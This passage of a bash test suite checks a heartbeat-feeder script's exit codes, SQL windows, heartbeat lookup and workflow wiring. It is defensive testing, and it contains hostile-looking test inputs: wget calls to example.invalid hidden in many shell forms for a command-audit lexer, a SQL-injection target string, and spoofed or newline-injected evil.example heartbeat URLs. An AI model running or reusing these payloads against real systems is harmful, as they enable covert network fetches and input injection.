_v="$(grep -noE "\bexit\b[[:space:]]*[^[:space:];)'\"]*" "$WORK/scan-positive.sh" | sed -E 's/[[:space:]]+$//' | grep -vE ':exit[[:space:]]+(0|3|4|64|78)$' || true)"
if [[ "$_v" == $'3:exit 1\n4:exit' ]]; then pass "scanner known-positive: flags exit 1 and a bare/variable exit"
else fail "scanner known-positive: got [$_v]"; fi
cases=$((cases + 1))
_sv="$(static_violations "$FEEDER_SRC")"
if [[ -z "$_sv" ]]; then pass "feeder: every static pin holds (exit contract, one EXIT trap, one beat site, no /fail, curl transport, HB_URL reads)"
else fail "feeder static violations: $(paste -sd, - <<<"$_sv")"; fi
cases=$((cases + 1))
if [[ -x "$FEEDER_SRC" ]]; then pass "feeder is executable"; else fail "feeder is not executable"; fi
cases=$((cases + 1))
_order="$(grep -nxE '  count_query "\$W" "\$PRED"|  resolve_heartbeat|  beat_once' <<<"$(strip_comments "$FEEDER_SRC")" | cut -d: -f2- | sed 's/^ *//' | paste -sd, -)"
if [[ "$_order" == 'count_query "$W" "$PRED",resolve_heartbeat,beat_once' ]]; then pass "main flow order: count_query, resolve_heartbeat, beat_once"
else fail "main flow order is [$_order]"; fi
cases=$((cases + 1))
if ! grep -qE 'FEEDER_NOW|_NOW\b|date -u' <<<"$(strip_comments "$FEEDER_SRC")"; then pass "feeder has no clock and no test seam (the SQL window is the only place time lives)"
else fail "feeder reads a clock or declares a test seam"; fi

echo "== the closed command set: the lexer itself is controlled =="
# audit_classes <snippet-text> -> the sorted violation classes the audit reports for a one-snippet script.
audit_classes() {
  printf '%s\n' "$1" > "$WORK/audit-snippet.sh"
  command_audit "$WORK/audit-snippet.sh" | sed -n 's/^V \([a-z]*\) .*/\1/p' | LC_ALL=C sort -u | paste -sd, -
}
# Known positives: every shape in which a command can hide must be reported, in the class the pin names.
audit_pos() { # <label> <class> <snippet>
  cases=$((cases + 1))
  local got; got="$(audit_classes "$3")"
  if grep -qwF -- "$2" <<<"${got//,/ }"; then pass "audit known-positive ($1): reported as $2"
  else fail "audit known-positive ($1): wanted a $2 violation, got [${got:-none}]"; fi
}
audit_neg() { # <label> <snippet>
  cases=$((cases + 1))
  local got; got="$(audit_classes "$2")"
  if [[ -z "$got" ]]; then pass "audit known-negative ($1): no violation"
  else fail "audit known-negative ($1): got [$got]"; fi
}
audit_pos "absolute path" outside '/usr/bin/wget -q example.invalid'
audit_pos "quoted command word" indirect '"wget" -q example.invalid'
audit_pos "single-quoted command word" indirect "'wget' -q example.invalid"
audit_pos "variable-built command word" indirect 'W=wg; ${W}get -q example.invalid'
audit_pos "substitution-built command word" indirect '$(echo wget) -q example.invalid'
audit_pos "after a pipe" outside 'echo a | wget -q'
audit_pos "after &&" outside 'true && wget -q example.invalid'
audit_pos "after then" outside 'if true; then wget -q example.invalid; fi'
audit_pos "in a case arm" outside 'case x in x) wget -q example.invalid ;; esac'
audit_pos "inside a double-quoted substitution" outside 'echo "$(wget -q example.invalid)"'
audit_pos "inside an assignment substitution" outside 'zz=$(wget -q example.invalid)'
audit_pos "inside a parameter default" outside 'x=${y:-$(wget -q example.invalid)}'
audit_pos "inside [[ ]]" outside '[[ -n "$(wget -q example.invalid)" ]]'
audit_pos "after an assignment prefix" outside 'FOO=1 wget -q example.invalid'
audit_pos "in a brace group" outside '{ wget -q example.invalid; }'
audit_pos "in a subshell" outside '( wget -q example.invalid )'
audit_pos "backtick substitution" indirect 'echo `wget -q example.invalid`'
audit_pos "unquoted heredoc that expands" indirect "$(printf 'cat <<EOF\n$(wget x)\nEOF')"
audit_pos "process substitution" indirect 'echo >(wget -q example.invalid)'
audit_pos "an unterminated substitution fails closed" parse 'echo $(wget -q example.invalid'
audit_pos "a tool no allowlist names (gh)" outside 'gh api -X POST repos/x/y/dispatches'
audit_neg "a comment" 'echo ok # wget -q example.invalid'
audit_neg "a quoted argument" 'echo "wget -q example.invalid" '"'wget'"
audit_neg "a single-quoted heredoc body" "$(printf "cat <<'EOF'\nwget -q example.invalid\nEOF" | sed 's/^cat/echo/')"
audit_neg "a case pattern and a for list" 'for a in wget nc; do echo "$a"; done; case "$1" in wget) echo x ;; esac'
audit_neg "a regex operand of [[ =~ ]]" '[[ "$x" =~ ^wget$ ]] && echo y'
audit_neg "a parameter pattern" 'echo "${v//wget/}"'
audit_neg "a redirection target" 'echo x >/dev/null 2>&1'
audit_neg "the one legal quoted command word" 'QUERY="$REPO_ROOT/x"; raw="$("$QUERY" "$SQL" 2>/dev/null)"'

echo "== target table: derived from the script, compared with the frozen expected set =="
discover_targets() { sed -n 's/^TARGETS="\(.*\)"$/\1/p' "$1" | head -1; }
_targets="$(discover_targets "$FEEDER_SRC")"
cases=$((cases + 1))
if [[ -n "$_targets" ]] && [[ "$(tr ' ' '\n' <<<"$_targets" | sort | paste -sd' ' -)" == "$(tr ' ' '\n' <<<"$EXPECT_TARGETS" | sort | paste -sd' ' -)" ]]; then
  pass "TARGETS is exactly {$EXPECT_TARGETS}"
else fail "TARGETS is [$_targets], expected [$EXPECT_TARGETS]"; fi
cases=$((cases + 1))
if [[ "$(wc -w <<<"$_targets")" -ge 1 ]]; then pass "anti-vacuity: at least one target discovered ($(wc -w <<<"$_targets"))"
else fail "anti-vacuity: 0 targets discovered — every per-target check would be vacuous"; fi
for t in $EXPECT_TARGETS; do
  cases=$((cases + 1))
  _body="$(fn_body "$FEEDER_SRC" select_target | awk -v t="$t" '$0 ~ "^[[:space:]]*" t "\\)" {on=1; next} on && /;;/ {print; on=0} on {print}')"
  if grep -qF "W=${E_WINDOW[$t]}" <<<"$_body" && grep -qF "NAME=\"${E_NAME[$t]}\"" <<<"$_body"; then pass "target $t: window ${E_WINDOW[$t]} and heartbeat name ${E_NAME[$t]}"
  else fail "target $t: window/name arm not as expected in select_target: [$_body]"; fi
done

echo "== selftest, usage and the target gate =="
cases=$((cases + 1))
_t0=$SECONDS
_o="$(env -i PATH=/usr/bin:/bin "$BASH_BIN" "$FEEDER_SRC" --selftest 2>&1)"; _rc=$?
if [[ "$_rc" == 0 && "$_o" == "deadman-feeder: selftest=ok" ]] && (( SECONDS - _t0 < 15 )); then pass "--selftest under env -i prints selftest=ok inside the 15 s cap"
else fail "--selftest: rc=$_rc output=[$_o]"; fi
reset_case; C_ARGS="--selftest"; C_Q=0
cases=$((cases + 1)); _rc="$(run_feeder)"
if [[ "$_rc" == 0 && "$(count_calls '.')" == 0 && "$(count_sql)" == 0 ]]; then pass "--selftest makes no curl call and no helper query (rc 0)"
else fail "--selftest touched the network or the helper: rc=$_rc calls=$(count_calls '.') sql=$(count_sql)"; fi
reset_case; C_ARGS=""; C_TARGET=""; C_Q=0
expect "an empty target is a usage error (64), no query" 64 usage "target=none"
reset_case; C_ARGS="--whatever"; C_Q=0
expect "an unknown flag is a usage error (64)" 64 usage "target_len=10"
reset_case; C_ARGS="$T_LUKS extra"; C_Q=0
expect "two arguments are a usage error (64)" 64 usage
reset_case; C_ARGS="--selftest extra"; C_Q=0
expect "--selftest with an extra argument is a usage error" 64 usage
reset_case; C_TARGET="bogus"; C_Q=0
expect "unknown target: 64, prints only the length" 64 usage "target_len=5"
reset_case; C_TARGET="luks-monitor-host-timer-x"; C_Q=0
expect "a target that merely starts with a real one is unknown" 64 usage
reset_case; C_TARGET="LUKS-MONITOR-HOST-TIMER"; C_Q=0
expect "target match is case-sensitive literal equality" 64 usage
reset_case; C_TARGET="$T_LUKS' OR 1=1 --"; C_Q=0
expect "a hostile target value is never interpolated or echoed" 64 usage "target_len=${#C_TARGET}"
cases=$((cases + 1))
if ! grep -qF "OR 1=1" "$OUT" && [[ "$(count_sql)" == 0 ]]; then pass "the hostile target value appears nowhere in the output and reached no query"
else fail "the hostile target value leaked or reached a query"; fi
reset_case; C_XTRACE=1; C_Q=0
expect "traced with a credential set is refused (78)" 78 xtrace_refused
reset_case; C_GHA=1; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx gha)"; C_BEATS=1; C_APIS=1
expect "inside GitHub Actions with a stale seam-named export the feeder runs normally (no seams exist)" 0 beat
reset_case; C_TLSENV=1; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx tlsenv)"; C_BEATS=1; C_APIS=1
expect "TLS/CA environment is scrubbed before the credentialed curls" 0 beat

echo "== luks-monitor-host-timer: the window, the host, the unit =="
LP() { reset_case; C_TARGET="$T_LUKS"; }
LP; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx l26)"; C_BEATS=1; C_APIS=1
expect "a passing row 26 h old (archive) beats" 0 beat "n=1"
LP; C_ROWS="$(row s3 "$((28 * H))" "$(luks_raw)" | fx l28)"; C_Q=3
expect "a passing row 28 h old withholds" 3 no_qualifying_row "n=0"
LP; C_ROWS="$(row s3 97199 "$(luks_raw)" | fx lb1)"; C_BEATS=1; C_APIS=1
expect "boundary: 97199 s old beats" 0 beat
LP; C_ROWS="$(row s3 97200 "$(luks_raw)" | fx lb2)"; C_Q=3
expect "boundary: exactly 97200 s old withholds (strict >)" 3 no_qualifying_row
LP; C_ROWS="$(row hot 600 "$(luks_raw)" | fx lhot)"; C_BEATS=1; C_APIS=1
expect "a passing row in the HOT arm beats" 0 beat
LP; C_ROWS="$(row hot "$((28 * H))" "$(luks_raw)" | fx lhot28)"; C_Q=3
expect "a passing row 28 h old in the HOT arm withholds (the hot arm carries its own lower bound)" 3 no_qualifying_row "n=0"
LP; C_ROWS="$(printf '' | fx lempty)"; C_Q=3
expect "empty window withholds; the diagnostics say the host is dark" 3 no_qualifying_row "any_rows=0 fail_rows=0"
LP; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw luks-monitor luks-monitor.service "$OK_MSG" soleur-web-2)" | fx lweb2)"; C_Q=3
expect "a soleur-web-2 row withholds (host_name conjunct)" 3 no_qualifying_row "any_rows=0"
LP; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw luks-monitor __none__)" | fx lverify)"; C_Q=3
expect "a verify-job row without _SYSTEMD_UNIT withholds" 3 no_qualifying_row
LP; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw luks-monitor session-41.scope)" | fx lscope)"; C_Q=3
expect "a verify-job row under a session scope withholds" 3 no_qualifying_row
LP; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw other-tag)" | fx lident)"; C_Q=3
expect "a row with another SYSLOG_IDENTIFIER withholds" 3 no_qualifying_row
LP; C_ROWS="$(row s3 "$((2 * H))" "$(luks_raw luks-monitor luks-monitor.service "$FAIL_MSG")" | fx lfail)"; C_Q=3
expect "a FAIL row (correct tag/unit/host) withholds; the diagnostics name it" 3 no_qualifying_row "any_rows=1 fail_rows=1"
LP; C_ROWS="$(row s3 "$((2 * H))" "$(luks_raw luks-monitor luks-monitor.service 'helper: probing the mount')" | fx lhelper)"; C_Q=3
expect "a helper row (same tag/unit/host, no OK needle) withholds; any_rows counts it" 3 no_qualifying_row "any_rows=1 fail_rows=0"
LP; C_ROWS="$(row hot -400 "$(luks_raw)" | fx lfut)"; C_Q=3
expect "a future-dated row (+400 s) withholds" 3 no_qualifying_row
LP; C_ROWS="$(row hot -300 "$(luks_raw)" | fx lfut300)"; C_BEATS=1; C_APIS=1
expect "future slack boundary: +300 s is accepted" 0 beat
LP; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" 0 | fx lrt0)"; C_Q=3
expect "an archive row with _row_type != 1 withholds" 3 no_qualifying_row
LP; C_ROWS="$({ row s3 "$((28 * H))" "$(luks_raw)"; row s3 "$((26 * H))" "$(luks_raw luks-monitor luks-monitor.service "$OK_MSG" soleur-web-2)"; } | fx lmix)"; C_Q=3
expect "only out-of-window and wrong-host rows: withholds" 3 no_qualifying_row
LP; C_ROWS="$({ row s3 "$((28 * H))" "$(luks_raw)"; row s3 "$((25 * H))" "$(luks_raw)"; } | fx lmix2)"; C_BEATS=1; C_APIS=1
expect "an old row beside an in-window one: the window row decides" 0 beat "n=1"
LP; C_ROWS="$({ row hot 60 "$(luks_raw)"; row s3 "$((25 * H))" "$(luks_raw)"; } | fx lmix3)"; C_BEATS=1; C_APIS=1
expect "rows in both arms are both counted" 0 beat "n=2"

echo "== claude-cost-capture: the cost marker arm and the credit-probe arm =="
CP() { reset_case; C_TARGET="$T_COST"; }
CP; C_ROWS="$(row s3 "$((20 * H))" "$(cost_raw cron:cron-roadmap-review)" | fx c20)"; C_BEATS=1; C_APIS=1
expect "a cron cost marker 20 h old beats" 0 beat "n=1"
CP; C_ROWS="$(row s3 "$((26 * H))" "$(cost_raw cron:cron-roadmap-review)" | fx c26)"
expect "a cron cost marker 26 h old withholds" 3 no_qualifying_row "n=0"
CP; C_ROWS="$(row s3 86399 "$(cost_raw cron:x)" | fx cb1)"; C_BEATS=1; C_APIS=1
expect "boundary: 86399 s old beats" 0 beat
CP; C_ROWS="$(row s3 86400 "$(cost_raw cron:x)" | fx cb2)"
expect "boundary: exactly 86400 s old withholds" 3 no_qualifying_row
CP; C_ROWS="$(row hot 300 "$(cost_raw cron:x)" | fx chot)"; C_BEATS=1; C_APIS=1
expect "a cost marker in the HOT arm beats" 0 beat
CP; C_ROWS="$(row s3 "$((2 * H))" "$(cost_raw cron:x null)" | fx cnull)"
expect "a marker with cost_usd null withholds" 3 no_qualifying_row
CP; C_ROWS="$(row s3 "$((2 * H))" "$(cost_raw cron:x absent)" | fx cabsent)"
expect "a marker with no cost_usd key withholds" 3 no_qualifying_row
CP; C_ROWS="$(row s3 "$((2 * H))" "$(cost_raw cron:x 0)" | fx czero)"; C_BEATS=1; C_APIS=1
expect "a marker with cost_usd 0 is a real (non-null) cost row and beats" 0 beat
CP; C_ROWS="$(row s3 "$((2 * H))" "$(cost_raw cron:x 3.1 claude-cost SOLEUR_CLAUDE_COST_DAILY)" | fx cdaily)"
expect "an org-total _DAILY row withholds (key match)" 3 no_qualifying_row
CP; C_ROWS="$(row s3 "$((2 * H))" "$(cost_raw session:abc123)" | fx cbyok)"
expect "a founder BYOK source (not cron:) withholds" 3 no_qualifying_row
CP; C_ROWS="$(row s3 "$((2 * H))" "$(cost_raw cron:x 0.1 github-issue)" | fx cecho)"
expect "an echoed marker under another component withholds" 3 no_qualifying_row
CP; C_ROWS="$(row s3 "$((2 * H))" "$(probe_raw anthropic-credit-exhausted)" | fx cprobe)"; C_BEATS=1; C_APIS=1
expect "a credit-probe RED row (credit exhausted) alone beats" 0 beat
CP; C_ROWS="$(row s3 "$((20 * H))" "$(probe_raw anthropic-key-invalid)" | fx cprobe2)"; C_BEATS=1; C_APIS=1
expect "a credit-probe RED row (key invalid), 20 h old, alone beats" 0 beat
CP; C_ROWS="$(row s3 "$((2 * H))" "$(probe_raw anthropic-key-missing)" | fx cprobe3)"
expect "a credit-probe row with another op withholds" 3 no_qualifying_row
CP; C_ROWS="$(row s3 "$((2 * H))" "$(jq -cn '{message:{feature:"cron-something-else",op:"anthropic-credit-exhausted"}}')" | fx cprobe4)"
expect "another feature with the RED op withholds" 3 no_qualifying_row
CP; C_ROWS="$(printf '' | fx cempty)"
expect "empty window withholds (no diagnostics for this target)" 3 no_qualifying_row "n=0"
cases=$((cases + 1))
if grep -qF 'cost-marker section' "$OUT" && grep -qF 'betterstack-log-query.md' "$OUT" && ! grep -qiE 'host is dark|checked host' "$OUT"; then pass "the cost withhold names the cost-marker runbook section and never claims the host is dark"
else fail "the cost withhold text is wrong (missing next-action line, or it claims a dark host)"; fi
CP; C_ROWS="$(row hot -400 "$(cost_raw cron:x)" | fx cfut)"
expect "a future-dated cost marker withholds" 3 no_qualifying_row
CP; C_ROWS="$(row s3 "$((20 * H))" "$(cost_raw cron:x)" 0 | fx crt0)"
expect "an archive cost row with _row_type != 1 withholds" 3 no_qualifying_row

echo "== the answer contract (the one-line aggregate) =="
LP; C_STUB="okstr"; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx a1)"; C_BEATS=1; C_APIS=1
expect "n as a quoted string (\"1\") beats" 0 beat "n=1"
LP; C_STUB="okstr"; C_ROWS="$(printf '' | fx a2)"; C_Q=3
expect "n as a quoted string (\"0\") on the epoch row withholds, never beats" 3 no_qualifying_row "n=0"
LP; C_STUB="ok"; C_ROWS="$(printf '' | fx a2b)"; C_Q=3
expect "n as the JSON number 0 on the epoch row withholds; no newest row is named" 3 no_qualifying_row "n=0 newest_dt=none"
# Zero-padded counts: the string test strips leading zeros, so "00"/"000" are zero (withhold) and "007" is 7.
LP; C_STUB="zpad2"; C_Q=3
expect "n:\"00\" is zero: withholds, never a beat" 3 no_qualifying_row "n=0 newest_dt=none"
LP; C_STUB="zpad3"; C_Q=3
expect "n:\"000\" is zero: withholds, never a beat" 3 no_qualifying_row "n=0 newest_dt=none"
LP; C_STUB="zpad7"; C_BEATS=1; C_APIS=1
expect "n:\"007\" is seven: beats and reports n=7 (not an octal or an expression)" 0 beat "n=7 "
# Wall time rides the marker (scan-cost growth must be visible), on a beat and on a withhold.
LP; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx elb)"; C_BEATS=1; C_APIS=1
expect "the beat marker carries elapsed_ms" 0 beat "elapsed_ms="
cases=$((cases + 1))
if grep -qE ' elapsed_ms=[0-9]+( |$)' "$OUT"; then pass "elapsed_ms is a number on the beat marker"; else fail "elapsed_ms is not numeric on the beat marker"; fi
LP; C_NOERT=1; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx elna)"; C_BEATS=1; C_APIS=1
expect "a bash without EPOCHREALTIME: elapsed_ms is na and the run still decides (no unbound-variable death under set -u)" 0 beat "elapsed_ms=na"
LP; C_ROWS="$(printf '' | fx elw)"; C_Q=3
expect "the withhold marker carries elapsed_ms" 3 no_qualifying_row "elapsed_ms="
cases=$((cases + 1))
if grep -qE ' elapsed_ms=[0-9]+( |$)' "$OUT"; then pass "elapsed_ms is a number on the withhold marker"; else fail "elapsed_ms is not numeric on the withhold marker"; fi
for _m in zero two garbage nonnumeric negn floatn bign exception nolinen nonobj nulln tabn exceptionn; do
  LP; C_STUB="$_m"; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx a-$_m)"
  expect "answer shape '$_m' is query_failed (never a beat, never a withhold-as-absent)" 3 query_failed "reason="
done
LP; C_STUB="fail"
expect "helper fails with a credential-bearing error: class only" 3 query_failed "class=auth"
LP; C_STUB="failbody"
expect "helper exits non-zero with a JSON error body on stdout: stdout is discarded unread" 3 query_failed "reason=helper_status"
LP; C_STUB="none"; C_Q=0
expect "helper missing" 3 query_failed "reason=helper_missing"
LP; C_UNSET="BETTERSTACK_QUERY_PASSWORD"; C_Q=0
expect "query secret unset" 3 query_failed "reason=secret_unset"
LP; C_STUB="hostile"; C_BEATS=1; C_APIS=1
expect "a hostile newest string is never echoed (newest_dt=unparsed)" 0 beat "newest_dt=unparsed"
cases=$((cases + 1))
if ! grep -q 'set-output' "$OUT"; then pass "the remote-derived newest string reached no output line"
else fail "a remote-derived string leaked into the output"; fi
LP; C_STUB="arabicnewest"; C_LCALL="en_US.utf8"; C_BEATS=1; C_APIS=1
expect "a non-C caller locale cannot widen [0-9]: Arabic-Indic digits in newest stay unparsed" 0 beat "newest_dt=unparsed"
LP; C_STUB="hugenewest"; C_BEATS=1; C_APIS=1
expect "an over-long newest string is never echoed" 0 beat "newest_dt=unparsed"
LP; C_STUB="numnewest"; C_BEATS=1; C_APIS=1
expect "a non-string newest is informational only (unparsed)" 0 beat "newest_dt=unparsed"
LP; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx a-newest)"; C_BEATS=1; C_APIS=1
expect "a well-formed newest is echoed in the marker-safe form (underscore for the space)" 0 beat "newest_dt=2026-10-29_"

echo "== the SQL the feeder sends (frozen shape, both arms, the archive filter) =="
for t in $EXPECT_TARGETS; do
  reset_case; C_TARGET="$t"; C_ROWS="$(printf '' | fx sqlpin-$t)"; C_Q=3; _g="$(run_feeder)"
  [[ "$t" == "$T_LUKS" ]] || C_Q=1
  _sql="$(head -1 "$SQLLOG")"
  cases=$((cases + 1))
  if [[ "$_sql" == "$(expect_sql "$t" "${E_PRED[$t]}")" ]]; then pass "$t: the first query equals the frozen SQL byte for byte (window ${E_WINDOW[$t]} in BOTH arms)"
  else fail "$t: the SQL differs from the frozen shape"; printf '        | got:  %s\n        | want: %s\n' "$_sql" "$(expect_sql "$t" "${E_PRED[$t]}")" >&2; fi
  cases=$((cases + 1))
  _w="${E_WINDOW[$t]}"
  if [[ "$(grep -oF "dt > now() - INTERVAL $_w SECOND" <<<"$_sql" | wc -l)" == 2 && "$(grep -oF "dt <= now() + INTERVAL 300 SECOND" <<<"$_sql" | wc -l)" == 2 \
        && "$_sql" == *'s3Cluster(primary, $BS_TABLE_S3) WHERE _row_type = 1 AND '* && "$_sql" == *'remote($BS_TABLE)'* ]]; then
    pass "$t: remote() AND s3Cluster arms each carry the lower and upper dt bound; the archive arm filters _row_type = 1"
  else fail "$t: window/archive pins do not hold in the sent SQL"; fi
  cases=$((cases + 1))
  _dollar="${_sql//\$BS_TABLE_S3/}"; _dollar="${_dollar//\$BS_TABLE/}"
  if [[ "$_dollar" != *'$'* && "$_sql" != *$'\n'* && "$_sql" != *--no-archive* ]]; then pass "$t: a dollar sign appears only as the two table tokens; one line; no --no-archive"
  else fail "$t: stray dollar sign, newline or --no-archive in the SQL"; fi
done
reset_case; C_ROWS="$(printf '' | fx sqlpin-diag)"; C_Q=3; _g="$(run_feeder)"
cases=$((cases + 1))
_d2="$(sed -n 2p "$SQLLOG")"; _d3="$(sed -n 3p "$SQLLOG")"
_anyp="JSONExtractString(raw, 'SYSLOG_IDENTIFIER') = 'luks-monitor' AND JSONExtractString(raw, '_SYSTEMD_UNIT') = 'luks-monitor.service' AND JSONExtractString(raw, 'host_name') = 'soleur-web-platform'"
if [[ "$_d2" == "$(expect_sql "$T_LUKS" "$_anyp")" && "$_d3" == "$(expect_sql "$T_LUKS" "$_anyp AND JSONExtractString(raw, 'message') LIKE 'FAIL (%'")" ]]; then
  pass "the two diagnostic queries are the same window with the identifier/unit/host (and the FAIL prefix) only"
else fail "the diagnostic queries are not the frozen shapes"; printf '        | %s\n        | %s\n' "$_d2" "$_d3" >&2; fi
cases=$((cases + 1))
if [[ "$(grep -c . <<<"$(fn_body "$FEEDER_SRC" withhold_no_row)")" -gt 0 ]]; then pass "withhold_no_row exists (the diagnostics live in one function)"
else fail "withhold_no_row function not found"; fi

echo "== heartbeat resolution =="
HP() { LP; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx hb)"; C_APIS=1; }
HP; C_API="$(hb_json "${E_NAME[$T_LUKS]}" true "$HB_URL" | fx apiPaused)"
expect "heartbeat paused: exit 0, nothing sent" 0 qualifying_row_heartbeat_paused "n=1"
HP; C_TARGET="$T_COST"; C_ROWS="$(row s3 "$((20 * H))" "$(cost_raw cron:x)" | fx hbc)"; C_API="$(hb_json "${E_NAME[$T_COST]}" true "$HB_URL" | fx apiPausedC)"
expect "heartbeat paused (cost target): exit 0, nothing sent" 0 qualifying_row_heartbeat_paused
HP; C_API="$(hb_json "${E_NAME[$T_LUKS]}" __absent__ "$HB_URL" | fx apiNoPaused)"
expect "paused attribute absent" 4 beat_failed "reason=paused_not_boolean"
HP; C_API="$(hb_json "${E_NAME[$T_LUKS]}" null "$HB_URL" | fx apiNullPaused)"
expect "paused attribute null" 4 beat_failed "reason=paused_not_boolean"
HP; C_API="$(hb_json "${E_NAME[$T_LUKS]}" '"false"' "$HB_URL" | fx apiStrPaused)"
expect "paused attribute the string \"false\"" 4 beat_failed "reason=paused_not_boolean"
HP; C_API="$(hb_json "soleur-other-heartbeat" false "$HB_URL" | fx apiOther)"
expect "heartbeat name absent" 4 beat_failed "reason=heartbeat_not_unique matches=0"
HP; C_API="$(hb_json "${E_NAME[$T_LUKS]}-old" false "$HB_URL" | fx apiPrefix)"
expect "prefix decoy (name plus a suffix) is not a match" 4 beat_failed "matches=0"
HP; C_API="$(hb_json "old-${E_NAME[$T_LUKS]}" false "$HB_URL" | fx apiPrefix2)"
expect "leading decoy (old-NAME) is not a match" 4 beat_failed "matches=0 paged=0"
HP; C_API="$(hb_json "${E_NAME[$T_COST]}" false "$HB_URL" | fx apiOtherTarget)"
expect "the OTHER target's heartbeat is not this target's (exact name per target)" 4 beat_failed "matches=0"
HP; C_API="$(hb_json "${E_NAME[$T_LUKS]}" false "$HB_URL" | jq -c '. + {pagination: {next: "https://x.example/page2"}}' | fx apiPaged1)"
expect "a unique match on page 1 is not trusted while a later page exists" 4 beat_failed "matches=1 paged=1"
HP; C_API="$(jq -cn '{data: [], pagination: {next: "https://x.example/page2"}}' | fx apiPaged2)"
expect "a heartbeat beyond page 1 is reported as paged, never as missing" 4 beat_failed "paged=1"
HP; C_API="$(jq -cn --argjson a "$(hb_json "${E_NAME[$T_LUKS]}" false "$HB_URL")" '{data: ($a.data + $a.data)}' | fx apiTwo)"
expect "two heartbeats with the name" 4 beat_failed "reason=heartbeat_not_unique matches=2"
for _u in "https://evil.example/api/v1/heartbeat/$BAD_URL_SENT" "http://uptime.betterstack.com/api/v1/heartbeat/$BAD_URL_SENT" \
          "https://uptime.betterstack.com/api/v1/heartbeat/$BAD_URL_SENT/fail" "https://uptime.betterstack.com/api/v1/heartbeat/$BAD_URL_SENT/extra" \
          "https://uptime.betterstack.com/api/v1/heartbeat/$BAD_URL_SENT?x=1" "https://uptime.betterstack.com.evil.example/api/v1/heartbeat/$BAD_URL_SENT" \
          "https://uptime.betterstack.com/api/v1/heartbeat/$BAD_URL_SENT\"x" "https://uptime.betterstack.com/api/v1/heartbeat/" \
          " https://uptime.betterstack.com/api/v1/heartbeat/$BAD_URL_SENT" $'https://uptime.betterstack.com/api/v1/heartbeat/'"$BAD_URL_SENT"$'\nurl = "https://evil.example/"' ""; do
  HP; C_API="$(hb_json "${E_NAME[$T_LUKS]}" false "$_u" | fx apiurl)"
  expect "URL shape refused: $(printf '%s' "${_u:-<empty>}" | tr '\n' '~' | head -c 60)" 4 beat_failed "reason=url_shape"
done
HP; C_APIMODE="fail"
expect "uptime API unreadable" 4 beat_failed "reason=api_unreadable"
HP; printf '<html>not json</html>' > "$WORK/fx/notjson"; C_API="$WORK/fx/notjson"
expect "uptime API answers something that is not a heartbeat list" 4 beat_failed "reason=api_malformed"
HP; C_TOKEN="__unset__"; C_APIS=0
expect "read-only token unset" 4 beat_failed "reason=api_token_unset"
HP; C_TOKEN="${BAD_TOKEN_SENT}\"x"; C_APIS=0
expect "read-only token malformed (quote and too short)" 4 beat_failed "reason=api_token_malformed"
HP; C_TOKEN="${BAD_TOKEN_SENT}abcdefg\""; C_APIS=0
expect "read-only token malformed (a quote alone, long enough)" 4 beat_failed "reason=api_token_malformed"
LP; C_ROWS="$(row s3 "$((28 * H))" "$(luks_raw)" | fx hbstale)"; C_TOKEN="__unset__"; C_Q=3
expect "a withhold happens before the credential is even read (no API call)" 3 no_qualifying_row

echo "== beat delivery =="
BP() { HP; }
BP; C_BEATMODE="500"; C_BEATS=1
expect "beat answered 500" 4 beat_failed "reason=http_status"
BP; C_BEATMODE="302"; C_BEATS=1
expect "beat answered 302 (passes curl -f; only 2xx counts)" 4 beat_failed "http=302"
BP; C_BEATMODE="429"; C_BEATS=1
expect "beat answered 429 with Retry-After: no retry (one call)" 4 beat_failed "http=429"
BP; C_BEATMODE="403body"; C_BEATS=1
expect "beat answered 403 with a credential-shaped body on stderr: nothing echoed" 4 beat_failed "http=403"
BP; C_BEATMODE="timeout"; C_BEATS=1
expect "beat stalls past --max-time (curl 28): beat_failed, no retry" 4 beat_failed "curl_rc=28"
BP; C_BEATMODE="curlfail"; C_BEATS=1
expect "beat curl fails outright" 4 beat_failed "reason=http_status"

echo "== EXIT trap: an undecided status is never an unexplained zero =="
land falloff '  beat_once' '  DECIDED=0; exit 0'; M_FALL="$M"
reset_case; C_SRC="$M_FALL"; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx fo)"; C_APIS=1; _rc="$(run_feeder)"
cases=$((cases + 1))
if [[ "$_rc" == 3 ]] && grep -qE 'verdict=trap_remapped( |$)' "$OUT"; then pass "an undecided exit 0 is remapped to 3 trap_remapped, never 0"
else fail "undecided exit 0: expected 3 trap_remapped, got $_rc [$(markers_of)]"; fi
land fallthrough5 '  beat_once' '  exit 5'; M="$M"
reset_case; C_SRC="$M"; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx fo5)"; C_APIS=1; _rc="$(run_feeder)"
cases=$((cases + 1))
if [[ "$_rc" == 3 ]] && grep -qE 'verdict=trap_remapped rc=5' "$OUT"; then pass "an unknown status (5) is remapped to 3 with rc=5 recorded"
else fail "unknown status 5: expected 3 trap_remapped rc=5, got $_rc [$(markers_of)]"; fi

echo "== workflow wiring =="
workflow_violations() { # <workflow-file> -> one line per violated pin
  "$PY" -I - "$1" "$FEEDER_SRC" <<'PYW'
import re, sys
import yaml
wfp, feeder = sys.argv[1], sys.argv[2]
text = open(wfp).read()
wf = yaml.safe_load(text)
bad = []
def need(c, m):
    if not c: bad.append(m)
on = wf.get(True) or wf.get("on") or {}
need(set(on) == {"schedule", "workflow_dispatch"}, "triggers-not-exactly-schedule-and-dispatch")
need(on.get("workflow_dispatch") in ({}, None), "dispatch-takes-inputs")
need([c.get("cron") for c in on.get("schedule", [])] == ["0 * * * *"], "fallback-cron")
need((wf.get("concurrency") or {}).get("group") == "scheduled-deadman-heartbeat-feeder" and (wf.get("concurrency") or {}).get("cancel-in-progress") is False, "concurrency")
need(wf.get("permissions") == {"contents": "read"}, "permissions")
need("env" not in wf, "workflow-level-env")
jobs = wf.get("jobs") or {}
need(len(jobs) == 1, "not-exactly-one-job")
